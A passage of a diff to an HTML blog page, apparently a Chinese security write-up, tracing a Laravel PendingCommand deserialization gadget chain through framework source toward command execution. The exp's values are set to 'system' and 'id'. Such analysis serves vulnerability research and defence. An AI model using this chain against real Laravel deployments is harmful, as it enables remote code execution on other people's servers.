+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hasExecuted</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">run</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>我们想要它执行下去，那就要保证条件判断过不了，正好初始值就是false，也省事了。然后跟进run方法</p>
 <p><code>Illuminate\Foundation\Testing\PendingCommand::run</code></p>
@@ -868,32 +868,32 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">run</span><span class="p">()</span>
-<span class="p">{</span>
-    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hasExecuted</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
-
-    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mockConsoleOutput</span><span class="p">();</span>
-
-    <span class="k">try</span> <span class="p">{</span>
-        <span class="nv">$exitCode</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">app</span><span class="p">[</span><span class="nx">Kernel</span><span class="o">::</span><span class="na">class</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">call</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">command</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parameters</span><span class="p">);</span>
-    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">NoMatchingExpectationException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMethodName</span><span class="p">()</span> <span class="o">===</span> <span class="s1">&#39;askQuestion&#39;</span><span class="p">)</span> <span class="p">{</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="o">-&gt;</span><span class="na">fail</span><span class="p">(</span><span class="s1">&#39;Unexpected question &#34;&#39;</span><span class="o">.</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getActualArguments</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">getQuestion</span><span class="p">()</span><span class="o">.</span><span class="s1">&#39;&#34; was asked.&#39;</span><span class="p">);</span>
-        <span class="p">}</span>
-
-        <span class="k">throw</span> <span class="nv">$e</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">expectedExitCode</span> <span class="o">!==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="o">-&gt;</span><span class="na">assertEquals</span><span class="p">(</span>
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">expectedExitCode</span><span class="p">,</span> <span class="nv">$exitCode</span><span class="p">,</span>
-            <span class="s2">&#34;Expected status code </span><span class="si">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">expectedExitCode</span><span class="si">}</span><span class="s2"> but received </span><span class="si">{</span><span class="nv">$exitCode</span><span class="si">}</span><span class="s2">.&#34;</span>
-        <span class="p">);</span>
-    <span class="p">}</span>
-
-    <span class="k">return</span> <span class="nv">$exitCode</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">run</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">hasExecuted</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mockConsoleOutput</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$exitCode</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">app</span><span class="p">[</span><span class="nx">Kernel</span><span class="o">::</span><span class="na">class</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">call</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">command</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parameters</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">NoMatchingExpectationException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMethodName</span><span class="p">()</span> <span class="o">===</span> <span class="s1">&#39;askQuestion&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="o">-&gt;</span><span class="na">fail</span><span class="p">(</span><span class="s1">&#39;Unexpected question &#34;&#39;</span><span class="o">.</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getActualArguments</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">getQuestion</span><span class="p">()</span><span class="o">.</span><span class="s1">&#39;&#34; was asked.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="nv">$e</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">expectedExitCode</span> <span class="o">!==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="o">-&gt;</span><span class="na">assertEquals</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">expectedExitCode</span><span class="p">,</span> <span class="nv">$exitCode</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;Expected status code </span><span class="si">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">expectedExitCode</span><span class="si">}</span><span class="s2"> but received </span><span class="si">{</span><span class="nv">$exitCode</span><span class="si">}</span><span class="s2">.&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$exitCode</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>可以看到一个很特殊的方法<code>$this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code>，结合该方法的注释<code>Execute the command.</code>。判断这里应该我们要利用的命令执行的地方，先在exp中定义好这两个成员变量，象征性的赋值system和id。然后跟进mockConsoleOutput方法，看一下该方法的定义，如果没有什么异常退出或修改成员变量值就不需要细致地看了，只要代码能顺利的运行下去就OK了。</p>
 <p><code>Illuminate\Foundation\Testing\PendingCommand::mockConsoleOutput</code></p>
@@ -925,31 +925,31 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">24
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">protected</span> <span class="k">function</span> <span class="nf">mockConsoleOutput</span><span class="p">()</span>
-<span class="p">{</span>
-    <span class="nv">$mock</span> <span class="o">=</span> <span class="nx">Mockery</span><span class="o">::</span><span class="na">mock</span><span class="p">(</span><span class="nx">OutputStyle</span><span class="o">::</span><span class="na">class</span><span class="o">.</span><span class="s1">&#39;[askQuestion]&#39;</span><span class="p">,</span> <span class="p">[</span>
-        <span class="p">(</span><span class="k">new</span> <span class="nx">ArrayInput</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parameters</span><span class="p">)),</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">createABufferedOutputMock</span><span class="p">(),</span>
-    <span class="p">]);</span>
-
-    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="o">-&gt;</span><span class="na">expectedQuestions</span> <span class="k">as</span> <span class="nv">$i</span> <span class="o">=&gt;</span> <span class="nv">$question</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nv">$mock</span><span class="o">-&gt;</span><span class="na">shouldReceive</span><span class="p">(</span><span class="s1">&#39;askQuestion&#39;</span><span class="p">)</span>
-            <span class="o">-&gt;</span><span class="na">once</span><span class="p">()</span>
-            <span class="o">-&gt;</span><span class="na">ordered</span><span class="p">()</span>
-            <span class="o">-&gt;</span><span class="na">with</span><span class="p">(</span><span class="nx">Mockery</span><span class="o">::</span><span class="na">on</span><span class="p">(</span><span class="k">function</span> <span class="p">(</span><span class="nv">$argument</span><span class="p">)</span> <span class="k">use</span> <span class="p">(</span><span class="nv">$question</span><span class="p">)</span> <span class="p">{</span>
-                <span class="k">return</span> <span class="nv">$argument</span><span class="o">-&gt;</span><span class="na">getQuestion</span><span class="p">()</span> <span class="o">==</span> <span class="nv">$question</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
-            <span class="p">}))</span>
-            <span class="o">-&gt;</span><span class="na">andReturnUsing</span><span class="p">(</span><span class="k">function</span> <span class="p">()</span> <span class="k">use</span> <span class="p">(</span><span class="nv">$question</span><span class="p">,</span> <span class="nv">$i</span><span class="p">)</span> <span class="p">{</span>
-                <span class="nx">unset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="o">-&gt;</span><span class="na">expectedQuestions</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
-
-                <span class="k">return</span> <span class="nv">$question</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
-            <span class="p">});</span>
-    <span class="p">}</span>
-
-    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">app</span><span class="o">-&gt;</span><span class="na">bind</span><span class="p">(</span><span class="nx">OutputStyle</span><span class="o">::</span><span class="na">class</span><span class="p">,</span> <span class="k">function</span> <span class="p">()</span> <span class="k">use</span> <span class="p">(</span><span class="nv">$mock</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="nv">$mock</span><span class="p">;</span>
-    <span class="p">});</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">protected</span> <span class="k">function</span> <span class="nf">mockConsoleOutput</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$mock</span> <span class="o">=</span> <span class="nx">Mockery</span><span class="o">::</span><span class="na">mock</span><span class="p">(</span><span class="nx">OutputStyle</span><span class="o">::</span><span class="na">class</span><span class="o">.</span><span class="s1">&#39;[askQuestion]&#39;</span><span class="p">,</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="k">new</span> <span class="nx">ArrayInput</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">parameters</span><span class="p">)),</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">createABufferedOutputMock</span><span class="p">(),</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="o">-&gt;</span><span class="na">expectedQuestions</span> <span class="k">as</span> <span class="nv">$i</span> <span class="o">=&gt;</span> <span class="nv">$question</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$mock</span><span class="o">-&gt;</span><span class="na">shouldReceive</span><span class="p">(</span><span class="s1">&#39;askQuestion&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="o">-&gt;</span><span class="na">once</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="o">-&gt;</span><span class="na">ordered</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="o">-&gt;</span><span class="na">with</span><span class="p">(</span><span class="nx">Mockery</span><span class="o">::</span><span class="na">on</span><span class="p">(</span><span class="k">function</span> <span class="p">(</span><span class="nv">$argument</span><span class="p">)</span> <span class="k">use</span> <span class="p">(</span><span class="nv">$question</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nv">$argument</span><span class="o">-&gt;</span><span class="na">getQuestion</span><span class="p">()</span> <span class="o">==</span> <span class="nv">$question</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}))</span>
+</span></span><span class="line"><span class="cl">            <span class="o">-&gt;</span><span class="na">andReturnUsing</span><span class="p">(</span><span class="k">function</span> <span class="p">()</span> <span class="k">use</span> <span class="p">(</span><span class="nv">$question</span><span class="p">,</span> <span class="nv">$i</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">unset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="o">-&gt;</span><span class="na">expectedQuestions</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nv">$question</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">app</span><span class="o">-&gt;</span><span class="na">bind</span><span class="p">(</span><span class="nx">OutputStyle</span><span class="o">::</span><span class="na">class</span><span class="p">,</span> <span class="k">function</span> <span class="p">()</span> <span class="k">use</span> <span class="p">(</span><span class="nv">$mock</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$mock</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>结果第一句代码就过不了emmm，查看一下报错信息：</p>
 <blockquote>
@@ -970,13 +970,13 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="sd">/**
-</span><span class="sd"> * The application instance.
-</span><span class="sd"> *
-</span><span class="sd"> * @var \Illuminate\Contracts\Foundation\Application
-</span><span class="sd"> */</span>
-<span class="k">protected</span> <span class="nv">$app</span><span class="p">;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="sd">/**
+</span></span></span><span class="line"><span class="cl"><span class="sd"> * The application instance.
+</span></span></span><span class="line"><span class="cl"><span class="sd"> *
+</span></span></span><span class="line"><span class="cl"><span class="sd"> * @var \Illuminate\Contracts\Foundation\Application
+</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
+</span></span><span class="line"><span class="cl"><span class="k">protected</span> <span class="nv">$app</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>$app变量声明了类型为<code>\Illuminate\Contracts\Foundation\Application</code>接口，由于接口不能实例化，我们需要实例化实现了该接口的类：<code>Illuminate\Foundation\Application</code>。当然，真正的原因不是这个，这个说法只是先接受一下这个设定，具体原因后面叙说，然后就可以成功的通过mockConsoleOutput方法。</p>
 <p>接下来开始尝试执行<code>$this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code>，这段代码也不是很好懂，看起来像是调用内核然后调用call方法命令执行，但是对其中的app、kernel等变量细节不是很清除，可以通过拆分结构来理解</p>
@@ -986,9 +986,9 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$kernel</span> <span class="o">=</span> <span class="nx">Kernel</span><span class="o">::</span><span class="na">class</span><span class="p">;</span> <span class="c1">// Illuminate\Contracts\Console\Kernel
-</span><span class="c1"></span><span class="nv">$ap</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">app</span><span class="p">[</span><span class="nx">Kernel</span><span class="o">::</span><span class="na">class</span><span class="p">];</span> <span class="c1">// Illuminate\Foundation\Application
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$kernel</span> <span class="o">=</span> <span class="nx">Kernel</span><span class="o">::</span><span class="na">class</span><span class="p">;</span> <span class="c1">// Illuminate\Contracts\Console\Kernel
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$ap</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">app</span><span class="p">[</span><span class="nx">Kernel</span><span class="o">::</span><span class="na">class</span><span class="p">];</span> <span class="c1">// Illuminate\Foundation\Application
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>跟进<code>$this-&gt;app[Kernel::class]</code>，进入了以下几段代码</p>
 <div class="highlight"><div class="chroma">
@@ -1011,23 +1011,23 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="c1">// Illuminate\Container\Container
-</span><span class="c1"></span><span class="k">public</span> <span class="k">function</span> <span class="nf">offsetGet</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">make</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="c1">// Illuminate\Foundation\Application
-</span><span class="c1"></span><span class="k">public</span> <span class="k">function</span> <span class="nf">make</span><span class="p">(</span><span class="nv">$abstract</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$parameters</span> <span class="o">=</span> <span class="p">[])</span>
-<span class="p">{</span>
-    <span class="nv">$abstract</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getAlias</span><span class="p">(</span><span class="nv">$abstract</span><span class="p">);</span>
-
-    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isDeferredService</span><span class="p">(</span><span class="nv">$abstract</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">instances</span><span class="p">[</span><span class="nv">$abstract</span><span class="p">]))</span> <span class="p">{</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">loadDeferredProvider</span><span class="p">(</span><span class="nv">$abstract</span><span class="p">);</span>
-    <span class="p">}</span>
-
-    <span class="k">return</span> <span class="k">parent</span><span class="o">::</span><span class="na">make</span><span class="p">(</span><span class="nv">$abstract</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// Illuminate\Container\Container
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">public</span> <span class="k">function</span> <span class="nf">offsetGet</span><span class="p">(</span><span class="nv">$key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">make</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Illuminate\Foundation\Application
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">public</span> <span class="k">function</span> <span class="nf">make</span><span class="p">(</span><span class="nv">$abstract</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$parameters</span> <span class="o">=</span> <span class="p">[])</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$abstract</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getAlias</span><span class="p">(</span><span class="nv">$abstract</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isDeferredService</span><span class="p">(</span><span class="nv">$abstract</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">instances</span><span class="p">[</span><span class="nv">$abstract</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">loadDeferredProvider</span><span class="p">(</span><span class="nv">$abstract</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">parent</span><span class="o">::</span><span class="na">make</span><span class="p">(</span><span class="nv">$abstract</span><span class="p">,</span> <span class="nv">$parameters</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>参考<a href="https://laravel.com/docs/8.x/container#the-make-method" target="_blank" rel="noopener">手册</a>可知是Application类在解析Kernel接口并返回Kernel实例，过程应该就相当于实例化，然后一步步跟下去，直到</p>
 <p><code>Illuminate\Container\Container::resolve</code></p>
@@ -1064,36 +1064,36 @@ php artisan serve --host<span class="o">=</span>0.0.0.0
 </span><span class="lnt">29
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">protected</span> <span class="k">function</span> <span class="nf">resolve</span><span class="p">(</span><span class="nv">$abstract</span><span class="p">,</span> <span class="nv">$parameters</span> <span class="o">=</span> <span class="p">[],</span> <span class="nv">$raiseEvents</span> <span class="o">=</span> <span class="k">true</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="nv">$abstract</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getAlias</span><span class="p">(</span><span class="nv">$abstract</span><span class="p">);</span>
-
-    <span class="nv">$needsContextualBuild</span> <span class="o">=</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$parameters</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span> <span class="nx">is_null</span><span class="p">(</span>
-        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getContextualConcrete</span><span class="p">(</span><span class="nv">$abstract</span><span class="p">)</span>
-    <span class="p">);</span>
-
-    <span class="c1">// If an instance of the type is currently being managed as a singleton we&#39;ll
-</span><span class="c1"></span>    <span class="c1">// just return an existing instance instead of instantiating new instances
-</span><span class="c1"></span>    <span class="c1">// so the developer can keep using the same objects instance every time.
-</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">instances</span><span class="p">[</span><span class="nv">$abstract</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="nv">$needsContextualBuild</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">instances</span><span class="p">[</span><span class="nv">$abstract</span><span class="p">];</span>
-    <span class="p">}</span>
-    
-    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">with</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$parameters</span><span class="p">;</span>
-
-    <span class="nv">$concrete</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getConcrete</span><span class="p">(</span><span class="nv">$abstract</span><span class="p">);</span>
-
-    <span class="c1">// We&#39;re ready to instantiate an instance of the concrete type registered for
-</span><span class="c1"></span>    <span class="c1">// the binding. This will instantiate the types, as well as resolve any of
-</span><span class="c1"></span>    <span class="c1">// its &#34;nested&#34; dependencies recursively until all have gotten resolved.
-</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">isBuildable</span><span class="p">(</span><span class="nv">$concrete</span><span class="p">,</span> <span class="nv">$abstract</span><span class="p">))</span> <span class="p">{</span>
-        <span class="nv">$object</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">build</span><span class="p">(</span><span class="nv">$concrete</span><span class="p">);</span>
-    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-        <span class="nv">$object</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">make</span><span class="p">(</span><span class="nv">$concrete</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="o">...</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">protected</span> <span class="k">function</span> <span class="nf">resolve</span><span class="p">(</span><span class="nv">$abstract</span><span class="p">,</span> <span class="nv">$parameters</span> <span class="o">=</span> <span class="p">[],</span> <span class="nv">$raiseEvents</span> <span class="o">=</span> <span class="k">true</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$abstract</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getAlias</span><span class="p">(</span><span class="nv">$abstract</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$needsContextualBuild</span> <span class="o">=</span> <span class="o">!</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$parameters</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span> <span class="nx">is_null</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getContextualConcrete</span><span class="p">(</span><span class="nv">$abstract</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// If an instance of the type is currently being managed as a singleton we&#39;ll
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// just return an existing instance instead of instantiating new instances
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// so the developer can keep using the same objects instance every time.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">instances</span><span class="p">[</span><span class="nv">$abstract</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="nv">$needsContextualBuild</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">instances</span><span class="p">[</span><span class="nv">$abstract</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">with</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$parameters</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$concrete</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getConcrete</span><span class="p">(</span><span class="nv">$abstract</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// We&#39;re ready to instantiate an instance of the concrete type registered for
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// the binding. This will instantiate the types, as well as resolve any of
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// its &#34;nested&#34; dependencies recursively until all have gotten resolved.
